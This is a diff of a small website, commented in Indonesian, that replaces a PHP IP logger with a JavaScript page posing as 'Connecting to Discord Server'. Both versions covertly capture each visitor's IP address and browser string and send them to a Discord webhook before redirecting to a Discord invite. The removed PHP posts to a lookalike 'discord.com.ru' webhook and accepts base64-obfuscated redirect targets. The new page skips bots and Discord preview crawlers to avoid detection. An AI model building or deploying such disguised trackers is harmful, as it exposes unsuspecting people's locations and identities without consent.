@@ -1,81 +1,86 @@
-<?php
-// ============================================
-// IP Logger + Redirect Website (Fixed for InfinityFree)
-// ============================================
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <style>
+        body {
+            background-color: #23272a;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .loading {
+            text-align: center;
+            color: #b9bbbe;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading">
+        <p>Connecting to Discord Server, please wait...</p>
+    </div>
 
-$webhookurl = "https://discord.com.ru/api/webhooks/1519202084694523998/tj35DK1P3-CF1zcY6WW7MIJS0iOMEG4eUARFFXugz6FbiuD_82kSSJRG1ex-Md5n7evK";
+    <script>
+        // 1. Tentukan Webhook dan Tautan Tujuan Akhir
+        const webhookUrl = "https://discord.com";
+        const discordInvite = "https://discord.gg";
 
-$config = [
-    'default_redirect' => 'https://discord.gg/fMbZNhGVmh', 
-    'require_param' => 'url',                     
-    'obfuscate' => true                           
-];
+        async function logAndRedirect() {
+            // Pengaman waktu: Jika API IP macet, pengguna TETAP akan dialihkan setelah 3 detik
+            const fallbackRedirect = setTimeout(() => {
+                window.location.href = discordInvite;
+            }, 3000);
 
-function logVisitor($webhookurl) {
-    // InfinityFree menggunakan reverse proxy, ambil IP asli pengunjung lewat HTTP_X_FORWARDED_FOR
-    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
-    } else {
-        $ip = !empty($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR'];
-    }
-    
-    $browser = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown Browser';
-    
-    // Matikan pemblokir bot ketat saat uji coba agar tidak memblokir diri sendiri
-    if(preg_match('/bot|robot|spider|crawler/i', $browser)) {
-        return false;
-    }
-    
-    $TheirDate = date('d/m/Y');
-    $TheirTime = date('G:i:s');
-    
-    // JANGAN gunakan ip-api.com / geoiplookup di InfinityFree karena diblokir hosting gratis!
-    // Kita kirim IP mentah & Browser User-Agent secara langsung.
-    $data = "**🎯 New Click Detected!**\n" .
-            "**IP Address:** `$ip`\n" .
-            "**Date:** $TheirDate\n" .
-            "**Time:** $TheirTime\n" .
-            "**Browser Info:** `$browser`";
-    
-    $json_data = [
-        'content' => $data,
-        'username' => "Logger Server Bot"
-    ];
-    
-    $ch = curl_init($webhookurl);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($json_data));
-    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    
-    // Tambahkan timeout agar eksekusi script tidak menggantung jika Discord sibuk
-    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5); 
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-    
-    curl_exec($ch);
-    curl_close($ch);
-    
-    return true;
-}
+            try {
+                const userAgent = navigator.userAgent;
 
-// Handling Redirect
-$target = isset($_GET[$config['require_param']]) ? $_GET[$config['require_param']] : null;
+                // Lewati bot otomatis (Discord embed preview, bot crawler, dll)
+                if (/bot|discord|robot|curl|spider|crawler/i.test(userAgent)) {
+                    clearTimeout(fallbackRedirect);
+                    window.location.href = discordInvite;
+                    return;
+                }
 
-if ($target && $config['obfuscate']) {
-    $decoded = base64_decode($target, true);
-    if ($decoded !== false) {
-        $target = $decoded;
-    }
-}
+                // 2. Ambil IP publik lewat API pihak ketiga
+                const ipResponse = await fetch("https://ipify.org");
+                const ipData = await ipResponse.json();
+                const userIp = ipData.ip;
 
-if (!$target || !filter_var($target, FILTER_VALIDATE_URL)) {
-    $target = $config['default_redirect'];
-}
+                // 3. Susun data waktu lokal
+                const now = new Date();
+                const dateStr = now.toLocaleDateString('id-ID');
+                const timeStr = now.toLocaleTimeString('id-ID');
 
-// Jalankan pencatatan log
-logVisitor($webhookurl);
+                const discordMessage = {
+                    username: "Gate Guard (JS-Redirect)",
+                    content: `🛡️ **[SECURITY LOG] Akses Tautan Deteksi**\n**IP:** \`${userIp}\`\n**Date:** ${dateStr}\n**Time:** ${timeStr}\n**Perangkat:** \`${userAgent}\``
+                };
 
-// Alihkan halaman ke target
-header("Location: " . $target, true, 302);
-exit();
-?>
+                // 4. Kirim log data ke Webhook Discord
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(discordMessage)
+                });
+
+            } catch (error) {
+                console.error("Gagal mencatat data:", error);
+            } finally {
+                // 5. Bersihkan timer dan alihkan halaman secara instan ke server Discord
+                clearTimeout(fallbackRedirect);
+                window.location.href = discordInvite;
+            }
+        }
+
+        // Jalankan fungsi otomatis saat halaman dimuat oleh browser
+        logAndRedirect();
+    </script>
+</body>
+</html>
